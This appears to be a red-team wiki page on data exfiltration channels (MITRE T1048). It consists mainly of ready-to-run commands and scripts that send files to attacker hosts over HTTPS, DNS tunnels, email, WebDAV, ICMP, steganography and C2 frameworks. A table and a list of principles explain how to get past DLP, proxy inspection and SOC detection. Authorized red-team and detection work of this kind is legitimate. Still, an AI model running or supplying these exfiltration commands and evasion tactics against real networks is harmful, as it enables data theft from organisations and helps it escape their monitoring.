# Exfiltration Channels

> **MITRE ATT&CK**: Exfiltration > T1048 - Exfiltration Over Alternative Protocol
> **Platforms**: Windows, Linux, macOS
> **Required Privileges**: User (network access)
> **OPSEC Risk**: Varies (HTTPS = Low, DNS = Low-Medium, ICMP = Medium, raw sockets = High)

## Strategic Overview

Exfiltration is the phase where engagements are most likely to be detected. Data Loss Prevention (DLP) systems, network monitoring, and proxy inspection are specifically designed to catch data leaving the network. A Red Team Lead must select the exfiltration channel based on the target's security posture: a mature SOC with SSL inspection and DLP requires DNS or steganographic channels, while an organization with basic perimeter security can be exfiltrated via HTTPS to cloud storage. The golden rule is to exfiltrate through channels that already carry legitimate data in the same format.

**Channel selection criteria**: Available egress protocols -> DLP/proxy inspection capabilities -> Volume of data -> Time constraints -> Acceptable risk level.

## Technical Deep-Dive

### HTTPS Exfiltration (Most Common)

```bash
# Upload to attacker-controlled server via HTTPS POST
curl -k -X POST -F "file=@data.7z" https://attacker-server.com/upload

# Upload to legitimate cloud storage (blends with normal traffic)
# AWS S3 (attacker-controlled bucket)
aws s3 cp data.7z s3://attacker-bucket/exfil/ --endpoint-url https://s3.amazonaws.com

# Azure Blob (SAS token)
azcopy copy data.7z "https://attackerstorage.blob.core.windows.net/exfil/data.7z?SAS_TOKEN"

# Google Drive via API
curl -X POST -H "Authorization: Bearer ACCESS_TOKEN" -F "metadata={name:'data.7z'};type=application/json" -F "file=@data.7z;type=application/octet-stream" "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart"
```

```powershell
# PowerShell HTTPS upload
Invoke-RestMethod -Uri "https://attacker.com/upload" -Method Post -InFile "C:\Temp\data.7z" -ContentType "application/octet-stream"

# Upload to OneDrive/SharePoint (blends with Microsoft 365 traffic)
# Uses existing user's OAuth token if available
```

### DNS Exfiltration (Stealthy, Slow)

```bash
# Theory: Encode data in DNS subdomain queries
# data -> hex/base64 -> chunk into labels -> query as subdomains
# AAAA.BBBB.CCCC.attacker-domain.com -> DNS resolves via attacker's authoritative NS

# dnscat2 -- full DNS tunnel (C2 + exfil)
# Server (attacker)
ruby dnscat2.rb --dns "domain=c2.attacker.com" --secret=shared_secret
# Client (target)
.\dnscat2.exe --dns "domain=c2.attacker.com" --secret=shared_secret

# DNSExfiltrator -- purpose-built for data exfiltration
# Server
python dnsexfiltrator.py -d attacker.com -p password
# Client (PowerShell)
Invoke-DNSExfiltrator -i C:\Temp\data.7z -d attacker.com -p password -t 500

# iodine -- IP-over-DNS tunnel
# Server
iodined -c -P password 10.0.0.1 tunnel.attacker.com
# Client
iodine -P password tunnel.attacker.com
# Then route traffic through the tunnel interface

# Manual DNS exfil (minimal tooling)
# Encode and send via nslookup/dig
for line in $(xxd -p data.7z | fold -w 60); do
    dig ${line}.exfil.attacker.com @8.8.8.8 +short
    sleep 0.5
done
```

### Cloud Storage Exfiltration

```bash
# Dropbox API upload, Mega.nz CLI (megaput), transfer.sh (anonymous)
# All use HTTPS to legitimate cloud storage -- blends with normal traffic
curl --upload-file data.7z https://transfer.sh/data.7z         # Anonymous
megaput --path /Root/exfil data.7z -u attacker@email.com -p pw  # Mega
```

### Email Exfiltration

```powershell
# Outlook COM object (uses existing Outlook session -- blends with user behavior)
$outlook = New-Object -ComObject Outlook.Application
$mail = $outlook.CreateItem(0)
$mail.To = "attacker@external.com"; $mail.Subject = "Monthly Report"
$mail.Attachments.Add("C:\Temp\data.7z"); $mail.Send()

# SMTP direct / Exchange mail rule auto-forward for persistent exfiltration
Send-MailMessage -From "user@corp.com" -To "attacker@external.com" -Subject "Report" -Attachments "C:\Temp\data.7z" -SmtpServer "mail.corp.com"
```

### Steganography

```bash
# steghide -- hide data in JPEG/BMP images
steghide embed -cf cover_image.jpg -ef data.7z -p password
# Exfil the image (appears as normal image upload/email attachment)
steghide extract -sf cover_image.jpg -p password

# OpenStego -- hide data in PNG images
openstego embed -mf data.7z -cf cover.png -sf output.png -p password

# Invoke-PSImage -- embed PowerShell in PNG pixels
Invoke-PSImage -Script "Get-Content C:\secrets.txt" -Image cover.png -Out steg.png
```

### ICMP Tunneling / WebDAV

```bash
# ptunnel-ng: TCP over ICMP (server: ptunnel-ng -s, client: ptunnel-ng -p IP -l 8080 -r IP -R 80)
# Manual ICMP exfil: encode data in ping payload -- xxd -p data.7z | ping -c 1 -p "$chunk" IP
```

```cmd
:: WebDAV -- mount attacker WebDAV share using Windows built-in client
net use Z: \\attacker.com@SSL\DavWWWRoot /user:anon anon
copy C:\Temp\data.7z Z:\exfil\ & net use Z: /delete
```

### C2 Channel Exfiltration

```
# Most practical approach -- use existing C2 connection
# Cobalt Strike
beacon> download C:\Temp\data.7z

# Sliver
sliver> download C:\Temp\data.7z /tmp/loot/

# Mythic
# Download task through web UI or CLI

# Advantage: No new network connections, encrypted, already trusted channel
# Disadvantage: Large files may impact beacon stability, slow with high sleep times
```

### Rate Limiting and Chunking (DLP Evasion)

```bash
# Chunk data and exfil with randomized delays to avoid DLP thresholds
split -b 512K data.7z chunk_
for f in chunk_*; do
    sleep $((RANDOM % 600 + 60))    # Random delay 1-11 minutes between chunks
    curl -s -k -o /dev/null -X POST -F "file=@$f" https://attacker.com/upload
done
```

## Detection & Evasion

| Channel | Detection Method | Evasion Strategy |
|---------|-----------------|------------------|
| HTTPS to unknown domains | Proxy logs, domain categorization | Use categorized domains, cloud storage services |
| DNS exfiltration | DNS query volume, entropy analysis, TXT record size | Low query rate, short labels, A record encoding |
| Email with attachments | DLP inspection, mail gateway | Encrypt attachments, use cloud links instead |
| ICMP tunneling | ICMP payload size analysis, session duration | Small payloads, mimic normal ping patterns |
| Cloud storage upload | CASB, proxy inspection | Use same cloud provider as target org |
| Large file transfers | NetFlow analysis, bandwidth anomalies | Chunk and rate-limit transfers |

**Critical evasion principles**: Always encrypt data before exfiltration (defeats DLP content inspection), exfiltrate during business hours, use protocols/destinations the org already uses, never exfiltrate raw NTDS.dit (extract only needed hashes), and rate-limit transfers below bandwidth anomaly thresholds.

## Cross-References

- [Data Staging](./data-staging.md)
- [Cloud Exfiltration](./cloud-exfiltration.md)
- [C2 Frameworks](../11-command-and-control/c2-frameworks.md)
- [DNS C2](../11-command-and-control/dns-c2.md)

## References

- MITRE ATT&CK T1048: https://attack.mitre.org/techniques/T1048/
- dnscat2: https://github.com/iagox86/dnscat2
- DNSExfiltrator: https://github.com/Arno0x/DNSExfiltrator
- steghide: http://steghide.sourceforge.net/
- MITRE T1041 (Exfil Over C2): https://attack.mitre.org/techniques/T1041/
